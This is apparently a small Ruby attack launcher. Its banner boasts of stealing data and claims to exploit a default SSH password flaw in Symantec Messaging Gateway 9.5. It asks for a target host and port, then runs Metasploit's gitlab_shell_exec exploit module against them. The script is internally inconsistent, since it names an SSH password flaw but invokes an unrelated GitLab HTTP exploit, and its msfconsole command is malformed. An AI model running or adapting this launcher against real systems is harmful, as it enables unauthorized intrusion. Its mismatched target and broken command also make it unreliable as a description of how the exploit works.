puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...

		Symantec Messaging Gateway 9.5 

		Default SSH Password Vulnerability

      	   Symantec Messaging Gateway 9.5

		The target ports: 
  						 SSH_PORT  22
"""

puts " [?] What is the target? "
print "[!] ---> "

target = gets.chomp

puts " [?] What is the Port ? [Start with 22]  "
print "[!] ---> "

port = gets.chomp




exec("msfconsole -x 'use exploit/multi/http/gitlab_shell_exec' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'run' 'run'")
